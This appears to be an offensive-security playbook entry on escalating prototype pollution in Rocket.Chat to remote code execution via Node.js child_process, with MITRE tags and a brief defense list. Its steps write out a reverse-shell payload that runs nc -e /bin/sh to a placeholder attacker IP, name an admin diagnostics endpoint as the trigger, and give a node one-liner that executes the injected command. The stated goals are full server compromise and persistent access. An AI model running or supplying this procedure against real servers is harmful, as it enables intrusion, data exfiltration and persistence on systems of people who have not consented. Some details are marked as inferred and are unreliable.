---
tags:
  - rce
  - command-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/node-command-injection-test]]'
platforms:
  - Node.js
techniques:
  - '[[Unix Shell]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 404fed16-49ed-4d24-b88e-72da774275e5
created_at: '2025-12-14T17:23:36.784Z'
updated_at: '2025-12-14T17:23:36.784Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Trigger-RCE-via-Command-Injection

## Summary

This procedure triggers remote code execution by exploiting the polluted prototype chain in Rocket.Chat to inject and execute arbitrary shell commands via Node.js child_process functions, leading to full server compromise.

## Description

Following prototype pollution, a property (e.g., 'command') in Object.prototype defaults to attacker-controlled values. When Rocket.Chat code invokes exec() or spawn() without explicit property checks, the polluted value injects commands. This targets admin contexts in Node.js/Meteor runtime, allowing RCE like spawning reverse shells. Outcomes include file access, data exfiltration, or persistence on the server.

## Requirements

1. Successful prototype pollution from prior procedure
2. Admin session active
3. Knowledge of code paths using child_process (inferred: plugin or settings execution)
4. Network access for command output (e.g., reverse shell listener)

## Defense

Defensive measures and detection strategies:

- Sanitize all object properties before use in exec/spawn
- Use template literals or parameterized execution to avoid injection
- Monitor process creation logs for anomalous commands (e.g., via auditd or Node.js debug)

## Objectives

1. Execute arbitrary commands on the server
2. Confirm RCE with output validation
3. Escalate to persistent access

## Instructions

### Step 1: Prepare Injected Command

**Context**: Ensure the polluted property contains executable code, e.g., appending shell metachars.

From prior pollution, set a property like __proto__.execCmd = 'malicious; nc -e /bin/sh attacker-ip 4444;'.

**Expected Output**: Pollution verified; ready for trigger.

### Step 2: Trigger Execution

**Context**: Interact with a feature that invokes the polluted function, e.g., a diagnostic or update endpoint.

Send a request to invoke process execution, such as POST /api/v1/admin/diagnostics.run.

**Expected Output**: Command runs; output in response or external listener.

### Step 3: Test RCE Locally

**Context**: Simulate in a local Node.js env to validate payload.

Execute [[commands/node-command-injection-test]]:

```bash
node -e "const cp = require('child_process'); cp.exec(Object.prototype.command || 'echo safe', (err, out) => console.log(out))"
```

> With polluted prototype, this executes the injected command instead of 'echo safe'.

**Expected Output**: Attacker command output, e.g., 'uid=0(root)' from whoami.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques


## Commands Used

- [[commands/node-command-injection-test]]

## Tools Used


## Tags

- [[rce]]
- [[command-injection]]
